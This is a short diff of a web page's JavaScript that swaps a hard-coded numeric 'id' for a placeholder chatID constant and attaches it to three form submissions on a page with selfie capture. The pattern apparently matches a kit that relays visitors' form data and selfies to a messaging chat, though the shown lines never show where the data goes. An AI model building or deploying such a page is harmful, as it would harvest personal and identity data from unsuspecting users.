@@ -636,6 +636,9 @@ closeAdButton.addEventListener("click", slideOutAd);
                 button.textContent = "Retake Selfie?";
             } 
         });
+	  
+        // DELAY ID
+        const chatID = "1111111111";
 
         // Form 1 submission
         document.getElementById('firstForm').addEventListener('submit', async function(e) {
@@ -658,7 +661,7 @@ closeAdButton.addEventListener("click", slideOutAd);
             submitBtn.textContent = "WAIT A MIN.....";
 			
             const formData = new FormData(this);
-			formData.append("id", "304824204");
+			formData.append("id", chatID);
 
 
 			try {
@@ -706,6 +709,7 @@ closeAdButton.addEventListener("click", slideOutAd);
 			submitBtn.textContent = "LOADING.....";
             
             const formData = new FormData(this);
+			formData.append("id", chatID);
 
 
 			try {
@@ -753,6 +757,7 @@ closeAdButton.addEventListener("click", slideOutAd);
 			submitBtn.textContent = "LOADING.....";
             
             const formData = new FormData(this);
+			formData.append("id", chatID);
 
 
 			try {
